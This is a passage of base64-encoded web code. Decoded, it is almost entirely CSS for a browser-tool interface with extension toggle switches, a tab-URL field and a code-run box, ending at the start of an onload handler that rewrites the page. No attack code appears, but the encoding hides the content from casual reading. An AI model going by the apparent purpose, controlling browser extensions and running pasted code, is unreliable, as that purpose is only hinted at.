JhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjNzIGVhc2UsIGJvcmRlci1jb2xvciAwLjNzIGVhc2U7Cn0KCi5leHRlbnNpb24tY2FyZDpoYXMoaW5wdXQ6Y2hlY2tlZCkgewogIGJhY2tncm91bmQtY29sb3I6ICMwMDA7CiAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKfQoKLmV4dGVuc2lvbi1jYXJkLWFsbCB7CiAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKICBtYXJnaW4tYm90dG9tOiAxMHB4OwogIHBhZGRpbmc6IDE1cHg7CiAgYm9yZGVyLXJhZGl1czogOHB4OwogIGRpc3BsYXk6IGZsZXg7CiAganVzdGlmeS1jb250ZW50OiBzdGFydDsKICBhbGlnbi1pdGVtczogY2VudGVyOwogIGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7CiAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjNzIGVhc2UsIGJvcmRlci1jb2xvciAwLjNzIGVhc2U7Cn0KCi5leHRlbnNpb24tY2FyZC1hbGw6aGFzKGlucHV0OmNoZWNrZWQpIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwogIGJvcmRlcjogMXB4IHNvbGlkICMzMzM7Cn0KCiAgICAgIC5leHRlbnNpb24taWNvbiB7CiAgICAgICAgd2lkdGg6IDMycHg7CiAgICAgICAgcGFkZGluZy1yaWdodDogMjBweDsKICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgIH0KICAgICAgLmV4dGVuc2lvbi1uYW1lIHsKICAgICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgfQoudG9nZ2xlLXN3aXRjaCB7CiAgbWFyZ2luLWxlZnQ6IGF1dG87IAogIG1hcmdpbi1yaWdodDogMDsKICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogIHdpZHRoOiA2MHB4OwogIGhlaWdodDogMzBweDsKfQoKLnRvZ2dsZS1zd2l0Y2ggaW5wdXQgewogIG9wYWNpdHk6IDA7CiAgd2lkdGg6IDA7CiAgaGVpZ2h0OiAwOwp9Cgouc2xpZGVyIHsKICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgY3Vyc29yOiBwb2ludGVyOwogIHRvcDogMDsKICBsZWZ0OiAwOwogIHJpZ2h0OiAwOwogIGJvdHRvbTogMDsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjcyNzJhOwogIHRyYW5zaXRpb246IDAuNHM7CiAgYm9yZGVyLXJhZGl1czogOTk5OXB4Owp9Cgouc2xpZGVyOmJlZm9yZSB7CiAgcG9zaXRpb246IGFic29sdXRlOwogIGNvbnRlbnQ6ICIiOwogIGhlaWdodDogMjZweDsgLyogSW5jcmVhc2VkIHNpemUgKi8KICB3aWR0aDogMjZweDsgIC8qIEluY3JlYXNlZCBzaXplICovCiAgbGVmdDogNHB4OwogIGJvdHRvbTogMnB4OwogIGJhY2tncm91bmQtY29sb3I6ICMwMDA7IAogIHRyYW5zaXRpb246IDAuNHM7CiAgYm9yZGVyLXJhZGl1czogNTAlOwogIHRyYW5zZm9ybTogdHJhbnNsYXRlWCgwKTsgLyogU3RhcnQgYnkgYWxpZ25pbmcgdGhlIGRvdCB0byB0aGUgbGVmdCAqLwp9CgppbnB1dDpjaGVja2VkICsgLnNsaWRlciB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZjsgCn0KCmlucHV0OmNoZWNrZWQgKyAuc2xpZGVyOmJlZm9yZSB7CiAgdHJhbnNmb3JtOiB0cmFuc2xhdGVYKDI2cHgpOyAvKiBBZGp1c3RlZCB0cmFuc2xhdGlvbiBmb3IgdGhlIGxhcmdlciBkb3QgKi8KfQoKCQkuaGVhZGVyIHsKICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgIH0KICAgICAgLmxvZ28gewogICAgICAgIHdpZHRoOiA0ZW07IAogICAgICAgIGhlaWdodDogYXV0bzsKICAgICAgICBtYXJnaW4tcmlnaHQ6IDEwcHg7CiAgICAgIH0KICAgICAgLnRhYmxpc3QtaXRlbSB7CiAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4OwogICAgICAgIGJhY2tncm91bmQtY29sb3I6IzAwMDsKICAgICAgICBwYWRkaW5nOiAxNXB4OwogICAgICAgIGJvcmRlci1yYWRpdXM6IDhweDsKICAgICAgICBkaXNwbGF5OiBmbGV4OwoJCWZvbnQtd2VpZ2h0OmJvbGQ7CiAgICAgICAganVzdGlmeS1jb250ZW50OiBzdGFydDsKICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgICB9CiAgICAgIC50YWJsaXN0LWl0ZW0gaW1nIHsKICAgICAgICBtYXgtd2lkdGg6IDI1cHg7CiAgICAgICAgbWFyZ2luLXJpZ2h0OiAxMHB4OwogICAgICB9CiAgICAgIC50YWJsaXN0LWl0ZW0gc3BhbiB7CiAgICAgICAgcGFkZGluZzogMTBweCwgMDsKICAgICAgICB0ZXh0LW92ZXJmbG93OiBlbGxpcHNpczsKICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICB3aGl0ZS1zcGFjZTogbm93cmFwOwogICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgd29yZC1icmVhazogYnJlYWstYWxsOwogICAgICB9CiAgICAgIC50YWJsaXN0LWl0ZW0gc3Bhbjpob3ZlciB7CiAgICAgICAgb3ZlcmZsb3c6IHZpc2libGU7IAogICAgICAgIHdoaXRlLXNwYWNlOiBub3JtYWw7CiAgICAgICAgaGVpZ2h0OmF1dG87ICAKICAgICAgfQpidXR0b24gewogICAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsgCiAgICBjb2xvcjogI2ZmZjsgCiAgICBib3JkZXI6IDFweCBzb2xpZCAjMzMzOyAKICAgIHBhZGRpbmc6IDhweCAxNnB4OyAKCW1hcmdpbjogNHB4IDJweDsKICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgIGJvcmRlci1yYWRpdXM6IDZweDsgCiAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuM3MsIGNvbG9yIDAuM3MsIGJvcmRlci1jb2xvciAwLjNzOwogICAgZm9udC1zaXplOiAxNHB4OyAKICAgIGZvbnQtd2VpZ2h0OiBib2xkOyAKCSAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsKfQoKYnV0dG9uOmhvdmVyIHsKICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMC4zcywgY29sb3IgMC4zcywgYm9yZGVyLWNvbG9yIDAuM3M7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMTExOyAKICAgIGJvcmRlci1jb2xvcjogI2ZmZjsgCgp9CmlucHV0IHsKICAgIHBhZGRpbmc6IDhweCAxNnB4OyAKCW1hcmdpbjogNHB4IDJweDsKCWNvbG9yOndoaXRlOwogICAgYm9yZGVyOiAxcHggc29saWQgIzMzMyAhaW1wb3J0YW50OyAKfQppbnB1dDpob3ZlciB7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMTExOyAKICAgIGJvcmRlci1jb2xvcjogI2ZmZjsgCn0KI3RvZ2dsZWFibGUtYnV0dG9ucyBidXR0b24gewogICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgZGlzcGxheTogaW5saW5lLWZsZXg7CiAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAganVzdGlmeS1jb250ZW50OiBmbGV4LXN0YXJ0OwogICAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjNzLCBjb2xvciAwLjNzOwogICAgb3ZlcmZsb3c6IGhpZGRlbjsKICAgIGJvcmRlcjogbm9uZTsKICAgIHBhZGRpbmc6IDlweCAxNXB4IDlweCA2MHB4OwogICAgdGV4dC1hbGlnbjogbGVmdDsKICAgIGJvcmRlci1yYWRpdXM6IDZweDsKICAgIGJhY2tncm91bmQtY29sb3I6IHdoaXRlOyAKICAgIGNvbG9yOiBibGFjazsgCiAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICBtYXJnaW46IDRweCAycHg7Cn0KCiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uOmhvdmVyIHsKICAgIGJhY2tncm91bmQtY29sb3I6ICNlMmUyZTI7IAp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvbjo6YmVmb3JlIHsKICAgIGNvbnRlbnQ6ICcnOwogICAgcG9zaXRpb246IGFic29sdXRlOwogICAgbGVmdDogMTJweDsKICAgIHRvcDogNTAlOwogICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC01MCUpOwogICAgd2lkdGg6IDQycHg7CiAgICBoZWlnaHQ6IDIycHg7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzMzOyAKICAgIGJvcmRlci1yYWRpdXM6IDEycHg7CiAgICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuM3M7Cn0KCiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uOjphZnRlciB7CiAgICBjb250ZW50OiAnJzsKICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgIGxlZnQ6IDE0cHg7CiAgICB0b3A6IDUwJTsKICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTsKICAgIHdpZHRoOiAxOHB4OwogICAgaGVpZ2h0OiAxOHB4OwogICAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZjsgCiAgICBib3JkZXItcmFkaXVzOiA1MCU7CiAgICB0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gMC4zcywgYmFja2dyb3VuZC1jb2xvciAwLjNzOwp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvblt0b2dnbGVkPSJ0cnVlIl0gewogICAgYmFja2dyb3VuZC1jb2xvcjogI2UyZTJlMjsgCn0KCiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uW3RvZ2dsZWQ9InRydWUiXTo6YmVmb3JlIHsKICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDA7IAp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvblt0b2dnbGVkPSJ0cnVlIl06OmFmdGVyIHsKICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKSB0cmFuc2xhdGVYKDIwcHgpOyAKICAgIGJhY2tncm91bmQtY29sb3I6ICNmZmY7IAp9CgogICAgICAuY29udGFpbmVyIHsKICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgIGdhcDogMTBweDsKICAgICAgfQogICAgICNjb2RlLXJ1biB7CiAgYWxpZ24tc2VsZjogZmxleC1zdGFydDsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmOyAKICBib3JkZXI6bm9uZTsKICBjb2xvcjogYmxhY2s7CiAgY3Vyc29yOiBwb2ludGVyOwogIGJvcmRlci1yYWRpdXM6IDVweDsKICBwYWRkaW5nOiA4cHggMTZweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuM3MgZWFzZS1pbi1vdXQ7Cn0KCiNjb2RlLXJ1bjpob3ZlciB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2UyZTJlMjsgCiAgYm9yZGVyOm5vbmU7Cn0KCiNjb2RlIHsKICBiYWNrZ3JvdW5kOiByZ2IoMCwgMCwgMCk7IAogIGNvbG9yOiB3aGl0ZTsKICB3aWR0aDogMTAwJTsKICBtaW4taGVpZ2h0OiA1MHB4OwogIGhlaWdodDogMjAwcHg7CiAgcmVzaXplOiBib3RoOwogIGJvcmRlcjogMXB4IHNvbGlkICM0QjRCNEQ7IAogIGJvcmRlci1yYWRpdXM6IDVweDsKICBmb250LWZhbWlseTogbW9ub3NwYWNlLCBzYW5zLXNlcmlmOwogIHBhZGRpbmc6IDhweDsKICBib3gtc2l6aW5nOiBib3JkZXItYm94OwogIHRyYW5zaXRpb246IG91dGxpbmUgMC4zcyBlYXNlLWluLW91dDsKfQoKI2NvZGU6Zm9jdXMgewpib3JkZXItY29sb3I6I2ZmZjsKfQoKICAgICAgaW5wdXRbdHlwZT0nY2hlY2tib3gnXSB7CiAgICAgICAgYWNjZW50LWNvbG9yOiAjZmZmICFpbXBvcnRhbnQ7CiAgICAgIH0KICAgICAgaW5wdXRbaWQ9J1RhYlVSTElucHV0J10gewogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwYTBhMGEgIWltcG9ydGFudDsKICAgICAgICBib3JkZXItY29sb3I6ICNmZmYgIWltcG9ydGFudDsKICAgICAgICBib3JkZXItc3R5bGU6IHNvbGlkOwogICAgICAgIGJvcmRlci1yYWRpdXM6IDNweDsKICAgICAgfQogICAgICAudG9hc3RbcG9wb3Zlcl06cG9wb3Zlci1vcGVuIHsKICAgICAgICBvcGFjaXR5OiAxOwogICAgICAgIHRvcDogNXB4OwogICAgICAgIGxlZnQ6IDUwJTsKICAgICAgfQogICAgICBAc3RhcnRpbmctc3R5bGUgewogICAgICAgIC50b2FzdFtwb3BvdmVyXTpwb3BvdmVyLW9wZW4gewogICAgICAgICAgb3BhY2l0eTogMDsKICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtMTAwJSk7CiAgICAgICAgfQogICAgICB9CiAgICAgIC50b2FzdFtwb3BvdmVyXSB7CiAgICAgICAgcG9zaXRpb246IGZpeGVkOwogICAgICAgIGluc2V0OiB1bnNldDsKICAgICAgICBwYWRkaW5nOiA1cHggMTBweDsKICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgICAgIG9wYWNpdHk6IDA7CiAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuNXMgYWxsb3ctZGlzY3JldGU7CiAgICAgICAgZm9udC13ZWlnaHQ6IGJvbGQ7CiAgICAgICAgYmFja2dyb3VuZDojMGEwYTBhOwogICAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjNDQ0OwogICAgICAgIHdoaXRlLXNwYWNlOiBwcmUtd3JhcDsKICAgICAgfQogICAgICBkaWFsb2dbb3Blbl0gewogICAgICAgIG9wYWNpdHk6IDE7CiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxKTsKICAgICAgfQogICAgICBkaWFsb2cgewogICAgICAgIG9wYWNpdHk6IDA7CiAgICAgICAgcGFkZGluZzogMzBweDsKICAgICAgICBwYWRkaW5nLWJvdHRvbTogMTVweDsKICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjMmQyZDJkOwogICAgICAgIHRyYW5zZm9ybTogc2NhbGUoMC45NSk7CiAgICAgICAgYmFja2dyb3VuZDogIzAwMDsKICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiByYWRpYWwtZ3JhZGllbnQoIzMzMyAxcHgsIHRyYW5zcGFyZW50IDFweCk7CiAgICAgICAgYmFja2dyb3VuZC1zaXplOiAycmVtIDJyZW07CiAgICAgICAgei1pbmRleDogLTE7CiAgICAgICAgYW5pbWF0aW9uOiBtb3ZlR3JpZCA0cyBsaW5lYXIgaW5maW5pdGU7CiAgICAgICAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1wb3NpdGlvbi14IDQwMG1zOwogICAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgICAgdHJhbnNpdGlvbjogb3ZlcmxheSAwLjVzIGFsbG93LWRpc2NyZXRlLCBkaXNwbGF5IDAuNXMgYWxsb3ctZGlzY3JldGUsIG9wYWNpdHkgMC41cyBhbGxvdy1kaXNjcmV0ZSwgdHJhbnNmb3JtIDAuNXMgYWxsb3ctZGlzY3JldGU7CiAgICAgICAgbWluLXdpZHRoOiA1MHZ3OwogICAgICAgIG1pbi1oZWlnaHQ6IDYwdmg7CiAgICAgICAgbWF4LXdpZHRoOiA1MHZ3OwogICAgICAgIG1heC1oZWlnaHQ6IDYwdmg7CiAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogICAgICB9CiAgICAgIEBzdGFydGluZy1zdHlsZSB7CiAgICAgICAgZGlhbG9nW29wZW5dIHsKICAgICAgICAgIG9wYWNpdHk6IDA7CiAgICAgICAgICB0cmFuc2Zvcm06IHNjYWxlKDAuOTUpOwogICAgICAgIH0KICAgICAgfQogICAgICBkaWFsb2c6OmJhY2tkcm9wIHsKICAgICAgICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsKICAgICAgICBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoMHB4KTsKICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC41cyBhbGxvdy1kaXNjcmV0ZTsKICAgICAgfQogICAgICBkaWFsb2dbb3Blbl06OmJhY2tkcm9wIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2IoMCAwIDAgLyAwLjI1KTsKICAgICAgICBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoM3B4KTsKICAgICAgfQogICAgICBAc3RhcnRpbmctc3R5bGUgewogICAgICAgIGRpYWxvZ1tvcGVuXTo6YmFja2Ryb3AgewogICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7CiAgICAgICAgICBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoMHB4KTsKICAgICAgICB9CiAgICAgIH0KICAgICAgZGlhbG9nIGRpdiB7CiAgICAgICAgbWluLXdpZHRoOiBhdXRvOwogICAgICAgIHdpZHRoOiBhdXRvOwogICAgICAgIGhlaWdodDogZml0LWNvbnRlbnQ7CiAgICAgICAgZm9udC1mYW1pbHk6ICdHZWlzdCcsIHNhbnMtc2VyaWY7CiAgICAgICAgd2hpdGUtc3BhY2U6IHByZS13cmFwOwogICAgICAgIHBhZGRpbmc6IG5vbmU7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjojMDAwOwoKICAgICAgfQogICAgICBkaWFsb2cgcCB7CiAgICAgICAgbWFyZ2luLWJvdHRvbTogOXB4OwogICAgICAgIHBhZGRpbmc6IDlweDsKICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjMjcyNzJhOwogICAgICAgIGNvbG9yOiBpbmhlcml0OwogICAgICAgIGZvbnQtZmFtaWx5OiBpbmhlcml0OwogICAgICAgIGZvbnQtc2l6ZTogaW5oZXJpdDsKICAgICAgICBmb250LXdlaWdodDogNzAwOwogICAgICAgIGJvcmRlci1yYWRpdXM6IDVweDsKICAgICAgICB3aWR0aDogYXV0bzsKICAgICAgfQogICAgICBkaWFsb2cgaDEgewogICAgICAgIGZvbnQtZmFtaWx5OiAnR2Vpc3QnLCBzYW5zLXNlcmlmOwogICAgICAgIGZvbnQtc2l6ZTogMS41cmVtOwogICAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgICBmb250LXdlaWdodDogOTAwOwogICAgICAgIG1hcmdpbi1ib3R0b206IDI1cHg7CiAgICAgICAgbWFyZ2luLXRvcDogMDsKICAgICAgfQoucHJhaGl0LWNvbnRhaW5lciB7CiAgcG9zaXRpb246IGZpeGVkOwogIHRvcDogNTAlOwogIGxlZnQ6IDUwJTsKICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTsKICB6LWluZGV4OiA5OTk5OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBkaXNwbGF5OiBmbGV4OwogIG1heC1oZWlnaHQ6IDkwJTsKICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogIGdhcDogMTBweDsgCiAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKfQoKLnByYWhpdC1pbWFnZSB7CiAgaGVpZ2h0OiA2MDBweDsKICBib3JkZXItcmFkaXVzOiAyMHB4OwogIGJveC1zaGFkb3c6IDAgNHB4IDEwcHggcmdiYSgwLCAwLCAwLCAwLjUpOwogIC13ZWJraXQtYW5pbWF0aW9uLW5hbWU6IHNoYWtlOwogIC13ZWJraXQtYW5pbWF0aW9uLWR1cmF0aW9uOiAwLjVzOwogIC13ZWJraXQtdHJhbnNmb3JtLW9yaWdpbjogNTAlIDUwJTsKICAtd2Via2l0LWFuaW1hdGlvbi1pdGVyYXRpb24tY291bnQ6IGluZmluaXRlOwp9CgpALXdlYmtpdC1rZXlmcmFtZXMgc2hha2UgewogIDAlIHsgLXdlYmtpdC10cmFuc2Zvcm06IHRyYW5zbGF0ZSg1cHgsIDNweCkgcm90YXRlKDBkZWcpOyB9CiAgMTAlIHsgLXdlYmtpdC10cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNXB4LCAtNnB4KSByb3RhdGUoLTNkZWcpOyB9CiAgMjAlIHsgLXdlYmtpdC10cmFuc2Zvcm06IHRyYW5zbGF0ZSgtOHB4LCAwcHgpIHJvdGF0ZSgzZGVnKTsgfQogIDMwJSB7IC13ZWJraXQtdHJhbnNmb3JtOiB0cmFuc2xhdGUoMHB4LCA2cHgpIHJvdGF0ZSgwZGVnKTsgfQogIDQwJSB7IC13ZWJraXQtdHJhbnNmb3JtOiB0cmFuc2xhdGUoM3B4LCAtNHB4KSByb3RhdGUoM2RlZyk7IH0KICA1MCUgeyAtd2Via2l0LXRyYW5zZm9ybTogdHJhbnNsYXRlKC0zcHgsIDZweCkgcm90YXRlKC0zZGVnKTsgfQogIDYwJSB7IC13ZWJraXQtdHJhbnNmb3JtOiB0cmFuc2xhdGUoLThweCwgM3B4KSByb3RhdGUoMGRlZyk7IH0KICA3MCUgeyAtd2Via2l0LXRyYW5zZm9ybTogdHJhbnNsYXRlKDVweCwgM3B4KSByb3RhdGUoLTNkZWcpOyB9CiAgODAlIHsgLXdlYmtpdC10cmFuc2Zvcm06IHRyYW5zbGF0ZSgtM3B4LCAtM3B4KSByb3RhdGUoM2RlZyk7IH0KICA5MCUgeyAtd2Via2l0LXRyYW5zZm9ybTogdHJhbnNsYXRlKDVweCwgNnB4KSByb3RhdGUoMGRlZyk7IH0KICAxMDAlIHsgLXdlYmtpdC10cmFuc2Zvcm06IHRyYW5zbGF0ZSgzcHgsIC02cHgpIHJvdGF0ZSgtM2RlZyk7IH0KfQoKLnByYWhpdC10ZXh0Ym94IHsKICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDAsIDAsIDAsIDAuOCk7IAogIGNvbG9yOiB3aGl0ZTsKICBwYWRkaW5nOiAxMHB4OwogIGJvcmRlci1yYWRpdXM6IDVweDsKICBmb250LXNpemU6IDE2cHg7CiAgbWF4LXdpZHRoOiAxMDAlOyAKICBtYXJnaW46IDEwcHggMDsKfQoKQC13ZWJraXQta2V5ZnJhbWVzIHNub3dmbGFrZXMtZmFsbHswJXt0b3A6LTEwJX0xMDAle3RvcDoxMDAlfX1ALXdlYmtpdC1rZXlmcmFtZXMgc25vd2ZsYWtlcy1zaGFrZXswJSwxMDAley13ZWJraXQtdHJhbnNmb3JtOnRyYW5zbGF0ZVgoMCk7dHJhbnNmb3JtOnRyYW5zbGF0ZVgoMCl9NTAley13ZWJraXQtdHJhbnNmb3JtOnRyYW5zbGF0ZVgoODBweCk7dHJhbnNmb3JtOnRyYW5zbGF0ZVgoODBweCl9fUBrZXlmcmFtZXMgc25vd2ZsYWtlcy1mYWxsezAle3RvcDotMTAlfTEwMCV7dG9wOjEwMCV9fUBrZXlmcmFtZXMgc25vd2ZsYWtlcy1zaGFrZXswJSwxMDAle3RyYW5zZm9ybTp0cmFuc2xhdGVYKDApfTUwJXt0cmFuc2Zvcm06dHJhbnNsYXRlWCg4MHB4KX19LnNub3dmbGFrZXtwb3NpdGlvbjpmaXhlZDt0b3A6LTEwJTt6LWluZGV4Ojk5OTk7LXdlYmtpdC11c2VyLXNlbGVjdDpub25lOy1tb3otdXNlci1zZWxlY3Q6bm9uZTstbXMtdXNlci1zZWxlY3Q6bm9uZTt1c2VyLXNlbGVjdDpub25lO2N1cnNvcjpkZWZhdWx0Oy13ZWJraXQtYW5pbWF0aW9uLW5hbWU6c25vd2ZsYWtlcy1mYWxsLHNub3dmbGFrZXMtc2hha2U7LXdlYmtpdC1hbmltYXRpb24tZHVyYXRpb246MTBzLDNzOy13ZWJraXQtYW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjpsaW5lYXIsZWFzZS1pbi1vdXQ7LXdlYmtpdC1hbmltYXRpb24taXRlcmF0aW9uLWNvdW50OmluZmluaXRlLGluZmluaXRlOy13ZWJraXQtYW5pbWF0aW9uLXBsYXktc3RhdGU6cnVubmluZyxydW5uaW5nO2FuaW1hdGlvbi1uYW1lOnNub3dmbGFrZXMtZmFsbCxzbm93Zmxha2VzLXNoYWtlO2FuaW1hdGlvbi1kdXJhdGlvbjoxMHMsM3M7YW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjpsaW5lYXIsZWFzZS1pbi1vdXQ7YW5pbWF0aW9uLWl0ZXJhdGlvbi1jb3VudDppbmZpbml0ZSxpbmZpbml0ZTthbmltYXRpb24tcGxheS1zdGF0ZTpydW5uaW5nLHJ1bm5pbmd9LnNub3dmbGFrZTpudGgtb2YtdHlwZSgwKXtsZWZ0OjElOy13ZWJraXQtYW5pbWF0aW9uLWRlbGF5OjBzLDBzO2FuaW1hdGlvbi1kZWxheTowcywwc30uc25vd2ZsYWtlOm50aC1vZi10eXBlKDEpe2xlZnQ6MTAlOy13ZWJraXQtYW5pbWF0aW9uLWRlbGF5OjFzLDFzO2FuaW1hdGlvbi1kZWxheToxcywxc30uc25vd2ZsYWtlOm50aC1vZi10eXBlKDIpe2xlZnQ6MjAlOy13ZWJraXQtYW5pbWF0aW9uLWRlbGF5OjZzLC41czthbmltYXRpb24tZGVsYXk6NnMsLjVzfS5zbm93Zmxha2U6bnRoLW9mLXR5cGUoMyl7bGVmdDozMCU7LXdlYmtpdC1hbmltYXRpb24tZGVsYXk6NHMsMnM7YW5pbWF0aW9uLWRlbGF5OjRzLDJzfS5zbm93Zmxha2U6bnRoLW9mLXR5cGUoNCl7bGVmdDo0MCU7LXdlYmtpdC1hbmltYXRpb24tZGVsYXk6MnMsMnM7YW5pbWF0aW9uLWRlbGF5OjJzLDJzfS5zbm93Zmxha2U6bnRoLW9mLXR5cGUoNSl7bGVmdDo1MCU7LXdlYmtpdC1hbmltYXRpb24tZGVsYXk6OHMsM3M7YW5pbWF0aW9uLWRlbGF5OjhzLDNzfS5zbm93Zmxha2U6bnRoLW9mLXR5cGUoNil7bGVmdDo2MCU7LXdlYmtpdC1hbmltYXRpb24tZGVsYXk6NnMsMnM7YW5pbWF0aW9uLWRlbGF5OjZzLDJzfS5zbm93Zmxha2U6bnRoLW9mLXR5cGUoNyl7bGVmdDo3MCU7LXdlYmtpdC1hbmltYXRpb24tZGVsYXk6Mi41cywxczthbmltYXRpb24tZGVsYXk6Mi41cywxc30uc25vd2ZsYWtlOm50aC1vZi10eXBlKDgpe2xlZnQ6ODAlOy13ZWJraXQtYW5pbWF0aW9uLWRlbGF5OjFzLDBzO2FuaW1hdGlvbi1kZWxheToxcywwc30uc25vd2ZsYWtlOm50aC1vZi10eXBlKDkpe2xlZnQ6OTAlOy13ZWJraXQtYW5pbWF0aW9uLWRlbGF5OjNzLDEuNXM7YW5pbWF0aW9uLWRlbGF5OjNzLDEuNXN9LnNub3dmbGFrZTpudGgtb2YtdHlwZSgxMCl7bGVmdDoyNSU7LXdlYmtpdC1hbmltYXRpb24tZGVsYXk6MnMsMHM7YW5pbWF0aW9uLWRlbGF5OjJzLDBzfS5zbm93Zmxha2U6bnRoLW9mLXR5cGUoMTEpe2xlZnQ6NjUlOy13ZWJraXQtYW5pbWF0aW9uLWRlbGF5OjRzLDIuNXM7YW5pbWF0aW9uLWRlbGF5OjRzLDIuNXN9Ci5zbm93Zmxha2UgewogIHotaW5kZXg6IDk5OwogIGNvbG9yOiAjZmZmZmZmOwogIGZvbnQtc2l6ZTogMWVtOwogIGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsKICB0ZXh0LXNoYWRvdzogMCAwIDVweCAjMDAwMDAwOwogIG9wYWNpdHk6IDAuNzsKfQp3aGl0ZWJ1dHRvbnMgYnV0dG9uIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiB3aGl0ZTsKICBib3JkZXI6IG5vbmU7CiAgY29sb3I6IGJsYWNrOwp9Cgp3aGl0ZWJ1dHRvbnMgYnV0dG9uOmhvdmVyIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZTJlMmUyOwp9CmxpdHN0dWZmewpjb2xvcjojNDQ0Owpmb250LWZhbWlseTogbW9ub3NwYWNlLCBzYW5zLXNlcmlmOwpmb250LXNpemU6MTJweDsKZm9udC13ZWlnaHQ6IG5vcm1hbDsKbWFyZ2luLWxlZnQ6NnB4Owpmb250LXN0eWxlOml0YWxpYzsKfQogICAgPC9zdHlsZT4KICBgOwoKb25sb2FkID0gYXN5bmMgZnVuY3Rpb24geCgpIHsKICAgIGxldCBmb3VuZE5vdGhpbmcgPSB0cnVlOwogICAgZG9jdW1lbnQub3BlbigpOwogICAgdGhpcy5kb2N1bWVudC53cml0ZShodG1sU3R5bGUp